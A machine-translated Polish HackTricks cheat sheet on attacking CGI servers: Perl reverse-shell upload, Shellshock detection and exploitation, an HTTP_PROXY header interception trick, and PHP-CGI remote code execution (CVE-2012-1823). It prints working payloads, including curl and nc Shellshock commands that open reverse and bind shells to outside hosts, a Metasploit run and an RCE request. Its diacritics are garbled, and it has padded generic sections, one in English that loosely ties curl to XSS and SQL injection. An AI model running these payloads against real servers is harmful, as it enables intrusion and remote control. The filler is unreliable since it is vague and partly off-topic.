<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


# Informacje

**Skrypty CGI s skryptami perl**, wic jeli zdobye dostp do serwera, kt贸ry mo偶e wykonywa skrypty _**.cgi**_, mo偶esz **przesa odwr贸con powok perl** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\), **zmieni rozszerzenie** z **.pl** na **.cgi**, nada **uprawnienia do wykonania** \(`chmod +x`\) i **uzyska dostp** do odwr贸conej powoki **z przegldarki internetowej**, aby j uruchomi.
Aby przetestowa podatnoci **CGI**, zaleca si u偶ycie `nikto -C all` \(i wszystkich wtyczek\)

# **ShellShock**

**ShellShock** to **podatno**, kt贸ra dotyczy powszechnie u偶ywanego powoki wiersza polece **Bash** w systemach operacyjnych opartych na Unix. Celuje w zdolno Bash do uruchamiania polece przekazywanych przez aplikacje. Podatno polega na manipulacji **zmiennymi rodowiskowymi**, kt贸re s dynamicznie nazwanymi wartociami, wpywajcymi na spos贸b dziaania proces贸w na komputerze. Atakujcy mog wykorzysta to, doczajc **zoliwy kod** do zmiennych rodowiskowych, kt贸ry jest wykonywany po otrzymaniu zmiennej. Pozwala to atakujcym potencjalnie naruszy system.

Wykorzystujc t podatno, **strona mo偶e wygenerowa bd**.

Mo偶esz **odnale藕** t podatno, zauwa偶ajc, 偶e u偶ywana jest **stara wersja Apache** i **cgi\_mod** \(z folderem cgi\) lub u偶ywajc **nikto**.

## **Test**

Wikszo test贸w polega na wywietleniu czego i oczekiwaniu, 偶e ten cig zostanie zwr贸cony w odpowiedzi sieciowej. Jeli uwa偶asz, 偶e strona mo偶e by podatna, wyszukaj wszystkie strony cgi i przetestuj je.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(odzwierciedlony, lepy i z wykorzystaniem kana贸w pobocznych\)**

Curl is a command-line tool that allows you to make HTTP requests. It can be used for various purposes, including testing and debugging web applications. In the context of web application penetration testing, Curl can be used to perform reflected, blind, and out-of-band attacks.

### **Reflected Attacks**

In a reflected attack, the payload is included in the request and the server reflects it back in the response. This can be used to exploit vulnerabilities such as Cross-Site Scripting (XSS). Curl can be used to send a request with a payload and analyze the response to determine if the payload is being reflected.

### **Blind Attacks**

In a blind attack, the payload is included in the request, but the response does not directly reveal the result of the attack. This can be used to exploit vulnerabilities such as Blind SQL Injection. Curl can be used to send requests with different payloads and analyze the response to infer information about the underlying system.

### **Out-of-Band Attacks**

In an out-of-band attack, the payload triggers a separate communication channel to send information from the target system to an external server controlled by the attacker. This can be used to exploit vulnerabilities such as Server-Side Request Forgery (SSRF) or to exfiltrate data from the target system. Curl can be used to send requests with payloads that trigger out-of-band communication and analyze the responses received on the external server.

Curl is a versatile tool that can be used in various scenarios during web application penetration testing. Understanding its capabilities and how to use it effectively can greatly enhance the testing process.
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## Wykorzystanie

### Wprowadzenie

Wykorzystanie to proces wykorzystywania podatnoci w celu uzyskania nieautoryzowanego dostpu lub wykonania niepo偶danych dziaa na systemie. W przypadku aplikacji CGI (Common Gateway Interface), wykorzystanie mo偶e obejmowa manipulacj parametrami 偶dania, wywoywanie niebezpiecznych polece lub wykorzystywanie podatnoci w skryptach CGI.

### Wykorzystanie podatnoci w skryptach CGI

Aby wykorzysta podatno w skryptach CGI, nale偶y najpierw zidentyfikowa potencjalne podatnoci, takie jak:

- Podatnoci zwizane z manipulacj parametrami 偶dania, takie jak podatno na wstrzyknicie SQL lub podatno na wstrzyknicie kodu PHP.
- Podatnoci zwizane z niebezpiecznymi poleceniami, takie jak podatno na wstrzyknicie polece systemowych.
- Podatnoci zwizane z nieprawidowym zarzdzaniem plikami, takie jak podatno na wstrzyknicie plik贸w.

Po zidentyfikowaniu podatnoci mo偶na przystpi do wykorzystania ich w celu uzyskania nieautoryzowanego dostpu lub wykonania niepo偶danych dziaa. Przykadowe techniki wykorzystania podatnoci w skryptach CGI obejmuj:

- Wstrzyknicie kodu PHP lub SQL poprzez manipulacj parametrami 偶dania.
- Wywoanie niebezpiecznych polece systemowych poprzez wstrzyknicie polece.
- Wstrzyknicie plik贸w, kt贸re mog prowadzi do wykonania niepo偶danych dziaa.

### Wykorzystanie podatnoci w serwerach CGI

Podatnoci w serwerach CGI mog by wykorzystywane w celu uzyskania nieautoryzowanego dostpu do systemu lub wykonania niepo偶danych dziaa. Przykadowe techniki wykorzystania podatnoci w serwerach CGI obejmuj:

- Wykorzystanie podatnoci w serwerze CGI do uzyskania dostpu do plik贸w systemowych lub bazy danych.
- Wykorzystanie podatnoci w serwerze CGI do wykonania niebezpiecznych polece systemowych.
- Wykorzystanie podatnoci w serwerze CGI do przekierowania ruchu sieciowego lub ataku typu Denial of Service (DoS).

### Wykorzystanie podatnoci w aplikacjach CGI

Podatnoci w aplikacjach CGI mog by wykorzystywane w celu uzyskania nieautoryzowanego dostpu do systemu lub wykonania niepo偶danych dziaa. Przykadowe techniki wykorzystania podatnoci w aplikacjach CGI obejmuj:

- Wykorzystanie podatnoci w aplikacji CGI do uzyskania dostpu do danych u偶ytkownik贸w.
- Wykorzystanie podatnoci w aplikacji CGI do wykonania niebezpiecznych operacji na danych.
- Wykorzystanie podatnoci w aplikacji CGI do przekierowania ruchu sieciowego lub ataku typu Denial of Service (DoS).

### Podsumowanie

Wykorzystanie podatnoci w aplikacjach CGI, serwerach CGI i skryptach CGI jest powszechn technik stosowan przez haker贸w w celu uzyskania nieautoryzowanego dostpu lub wykonania niepo偶danych dziaa. Aby zabezpieczy system przed wykorzystaniem podatnoci CGI, nale偶y regularnie aktualizowa oprogramowanie, przeprowadza audyty bezpieczestwa i stosowa najlepsze praktyki programistyczne.
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **Proxy \(MitM do 偶da serwera WWW\)**

CGI tworzy zmienn rodowiskow dla ka偶dego nag贸wka w 偶daniu HTTP. Na przykad: "host:web.com" jest tworzone jako "HTTP\_HOST"="web.com"

Poniewa偶 zmienna HTTP\_PROXY mo偶e by u偶ywana przez serwer WWW, spr贸buj wysa **nag贸wek** zawierajcy: "**Proxy: &lt;IP\_atakujcego&gt;:&lt;PORT&gt;**", a jeli serwer wykonuje jakiekolwiek 偶danie podczas sesji, bdziesz w stanie przechwyci ka偶de 偶danie wykonane przez serwer.

# Stary PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

W zasadzie, jeli cgi jest aktywne, a php jest "stare" \(&lt;5.3.12 / &lt; 5.4.2\), mo偶na wykona kod.
Aby wykorzysta t podatno, musisz uzyska dostp do pewnego pliku PHP serwera WWW bez wysyania parametr贸w \(szczeg贸lnie bez wysyania znaku "="\).
Nastpnie, aby przetestowa t podatno, mo偶na na przykad uzyska dostp do `/index.php?-s` \(zauwa偶 "-s"\) i **kod 藕r贸dowy aplikacji pojawi si w odpowiedzi**.

Nastpnie, aby uzyska **RCE**, mo偶na wysa to specjalne zapytanie: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` i **kod PHP** do wykonania w **treci 偶dania**.
Przykad:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Wicej informacji na temat podatnoci i mo偶liwych atak贸w:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**Przykad rozwizania CTF**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**



<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
